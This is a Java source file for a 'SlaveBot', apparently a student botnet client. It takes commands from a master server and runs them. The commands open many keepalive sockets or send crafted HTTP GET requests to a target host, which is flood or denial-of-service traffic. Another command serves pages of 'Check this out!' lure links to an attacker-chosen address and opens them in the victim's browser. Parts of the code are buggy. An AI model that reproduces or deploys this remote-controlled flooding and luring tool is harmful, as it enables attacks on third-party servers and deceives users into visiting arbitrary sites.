
/********Slave Bot********/

//package javaproj;
//package finalcheck;




import java.util.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.net.*;
import java.io.*;
import java.awt.Desktop;
import java.net.URI;
import java.net.InetSocketAddress;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;




/**
* @author preethi
*/
public class SlaveBot {
	private static Socket clientSocket;
	private static ArrayList<Socket> connectionList = new ArrayList<Socket>();

	public static void main(String[] params) {
		if (params[0].equals("-h") && params[2].equals("-p")) {
			String serverIp = params[1];
			int connectServerPort = Integer.parseInt(params[3]);
			/* Connect to server */
			try {
				clientSocket = new Socket(serverIp, connectServerPort);
			} catch (UnknownHostException exceptionStack) {
				System.out.println(exceptionStack);
			} catch (IOException exceptionStack) {
				System.out.println(exceptionStack);
			}
		} else {
			/* Restart if incorrect parameters */
			System.exit(-1);
		}
		while (true) {
			InputStreamReader recievedStreamCommandFromServer;
			try {
				recievedStreamCommandFromServer = new InputStreamReader(clientSocket.getInputStream());

				BufferedReader commandFromServer = new BufferedReader(recievedStreamCommandFromServer);
				String serverCommand = commandFromServer.readLine();
				/* Split command to execute */
				String[] command = serverCommand.split("\\s+");
				 String ipaddr = "http://"+command[1];
				 String ipaddr1= "http://localhost:"+command[2]+"/page1" ;
				 String ipaddr2= "http://localhost:"+command[2]+"/page2" ;
				 StringBuilder sb1 = new StringBuilder();
					sb1.append("<html>");
					sb1.append("<head><h1>Very important link</h1></head>");
					sb1.append("<body>");
					sb1.append("<br><br><a href=").append(ipaddr1).append(">").append("Check this out!").append("</a>");
					sb1.append("<br><br><a href=").append(ipaddr2).append(">").append("Check this out!").append("</a>");
					sb1.append("</body>");
					sb1.append("</html>");
					String fake1 = sb1.toString();

				StringBuilder sb = new StringBuilder();
					sb.append("<html>");
					sb.append("<head><h1>Very important link</h1></head>");
					sb.append("<body>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("<br><br><a href=").append(ipaddr).append(">").append("Check this out!").append("</a>");
					sb.append("</body>");
					sb.append("</html>");
					String fake = sb.toString();
				if (command[0].equals("connect")) {
					try {
						/* Get server port to connect from command */
						int target_port = Integer.parseInt(command[2]);
						/* Get number of connections to connect from command */
						int numberOfConnections = Integer.parseInt(command[3]);
						System.out.println("Number of connections : " + numberOfConnections+command[1]);
						int connections = 0;
						while(connections < numberOfConnections) {
							if(serverCommand.contains("keepalive")) {
							Socket socketConnection = new Socket(command[1], target_port);
							socketConnection.setKeepAlive(true);
							System.out.println(socketConnection);
							System.out.println("Keepalive: "+socketConnection.getKeepAlive());
							connectionList.add(socketConnection);
							}
							else if(serverCommand.contains("url")) {
								String[] urlrequest=command[4].split("=");
								String urlqry= new String();
								String url = null;
								if(urlrequest.length!=3) {
									char[] randomString = "abcjkdvnkjvnvlkceifhohjeofjdcksnclakshfeoifhksncklcnlskkd".toCharArray();
									Random variance = new Random();
									int end = variance.nextInt(10)+1;
									url = (randomString.toString()).substring(1, end);
									switch(target_port) {
									case 80:
										urlqry = "http://" + command[1] + urlrequest[1] + "=" + url;
									    break;
									case 443:
										urlqry = "https://" + command[1] + urlrequest[1] + "=" +url;
										break;
										default:
											break;
									}
								}
								else {
									switch(target_port) {
									case 80:
										urlqry = "http://" + command[1] + urlrequest[1] + "=" + urlrequest[2];
									break;
									case 443:
										urlqry = "https://" + command[1] + urlrequest[1] + "=" + urlrequest[2];
										break;
									default:
										break;
									}
								}
								System.out.println(""+urlqry);
                              URI uriRequest = new URI( urlqry);
								Socket s = new Socket(command[1],target_port);
								connectionList.add(s);
								System.out.println(s);
								PrintWriter pw = new PrintWriter(s.getOutputStream());
								if(target_port == 80) {
									pw.print("GET " + uriRequest.getRawPath( ) + " HTTP/1.1\r\n" +
						                       "Host: " + uriRequest.getHost( ) + "\r\n");
								}

								else if(target_port == 443) {
									pw.print("GET " + uriRequest.getRawPath( ) + " HTTPS/1.2\r\n" +
						                       "Host: " + uriRequest.getHost( ) + "\r\n");
								}
									pw.flush();
								}

								else
								{
									Socket s = new Socket(command[1],target_port);
									System.out.println(s);
									System.out.println("keep-alive function: "+s.getKeepAlive());
									connectionList.add(s);
								}connections++;
							}
						}

					catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}else if (command[0].equals("rise-fake-url")) {
					try {
						/* Get server port to connect from command */
						int target_port = Integer.parseInt(command[2]);
						/* Get number of connections to connect from command */
						int numberOfConnections = 1;
						System.out.println("Number of connections : " + numberOfConnections+command[1]);

						for(int connections = 0;connections < numberOfConnections;connections++) {
							String urlqry= new String();
								System.out.println("Connected");
								 HttpServer server = HttpServer.create(new InetSocketAddress(target_port), 0);
								 HttpHandler handler=new HttpHandler() {
									 public void handle(HttpExchange t) throws IOException {
                                         byte [] response =fake1.getBytes();
                                         t.sendResponseHeaders(200, response.length);
                                         OutputStream os = t.getResponseBody();
									       os.write(response);
									       t.close();
									       os.close();

									      }
								 };
								    server.createContext("/test", handler);
								    switch(target_port) {
								    case 80:
								        urlqry = "http://localhost:" + target_port +"/test" ;
								        break;
								    case 443:
								        urlqry = "https://localhost:" + target_port +"/test" ;
								        break;
								    default:
								    	urlqry = "http://localhost:" + target_port +"/test" ;
								        break;
								    }
								    Desktop d=Desktop.getDesktop();
								    d.browse(new URI(urlqry));
								    //Thread.sleep(1000);
								    HttpHandler handler1=new HttpHandler() {
										 public void handle(HttpExchange t) throws IOException {
										        byte [] response = fake.getBytes();
										        t.sendResponseHeaders(200, response.length);
										        OutputStream os = t.getResponseBody();
										        os.write(response);
										        t.close();
										        os.close();
										      }
									 };
									server.createContext("/page1", handler1);
								    System.out.println(""+urlqry);
								    HttpHandler handler2=new HttpHandler() {
										 public void handle(HttpExchange t) throws IOException {
										        byte [] response = fake.getBytes();
										        t.sendResponseHeaders(200, response.length);
										        OutputStream os = t.getResponseBody();
										        os.write(response);
										        t.close();
										        os.close();
										      }
									 };
									server.createContext("/page2", handler2);
								    server.setExecutor(null); // creates a default executor
								    server.start();
								    
						}

						}

					catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}else if (command[0].equals("down-fake-url")) {
					try {
						System.exit(0);
						/* Get server port to connect from command */
						int target_port = Integer.parseInt(command[2]);
						/* Get number of connections to connect from command */
						int numberOfConnections = 1;
						System.out.println("Number of connections : " + numberOfConnections+command[1]);

						for(int connections = 0;connections < numberOfConnections;connections++) {
							String urlqry= new String();
							 HttpServer server = HttpServer.create(new InetSocketAddress(target_port), 0);
							 server.stop(0);
								 HttpHandler handler=new HttpHandler() {
									 public void handle(HttpExchange t) throws IOException {
										    server.stop(0);
									        byte [] response =fake1.getBytes();
									        t.sendResponseHeaders(200, response.length);
									        OutputStream os = t.getResponseBody();
									        os.write(response);
									        t.close();
									        os.close();
									        
									      }
								 };
								 
								    server.createContext("/test", handler);
								    switch(target_port) {
								    case 80:
								        urlqry = "http://localhost:" + target_port +"/test" ;
								    break;
								    case 443:
								        urlqry = "https://localhost:" + target_port +"/test" ;
								    break;
								    default:
								    	urlqry = "http://localhost:" + target_port +"/test" ;
								    break;
								    }
								    Desktop d=Desktop.getDesktop();
								    d.browse(new URI(urlqry));
								    server.setExecutor(null); // creates a default executor
								    server.start();
								    server.stop(0);
                                   System.exit(0);

						}
						}catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}else if (command[0].equals("disconnect")) {
					int connectionSize = connectionList.size();
					try {
						for(int socketConnections = 0 ; socketConnections <  connectionSize; socketConnections++){
							String clientIp = connectionList.get(0).getInetAddress().toString();
							String split = "/";
							int ip = clientIp.indexOf(split);
							clientIp = clientIp.substring(ip + 1);
							String clientTargetToClose = command[1];

							if ((command.length == 2) && ((clientTargetToClose.equals("all")) || (clientTargetToClose.equals(clientIp)) || (clientTargetToClose
									.equals(connectionList.get(0).getInetAddress().getHostName().toString())))) {
								connectionList.get(0).shutdownInput();
								connectionList.get(0).shutdownOutput();
								connectionList.get(0).close();
								connectionList.remove(0);
								//System.out.println("socket closed - all");
							} else if ((command.length == 3) && ( (clientTargetToClose.equals("all")) || clientTargetToClose.equals(clientIp))
									|| clientTargetToClose
											.equals(connectionList.get(0).getInetAddress().getHostName().toString())) {
								if (Integer.parseInt(command[2]) == connectionList.get(0).getPort()) {
									connectionList.get(0).shutdownInput();
									connectionList.get(0).shutdownOutput();
									connectionList.get(0).close();
									connectionList.remove(0);
									//System.out.println("socket closed - port : " + connectionList.get(0).getPort());
								}
							}
						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}
			} catch (Exception exceptionStack) {
				System.out.println(exceptionStack);
			}
		}
	}

	   }

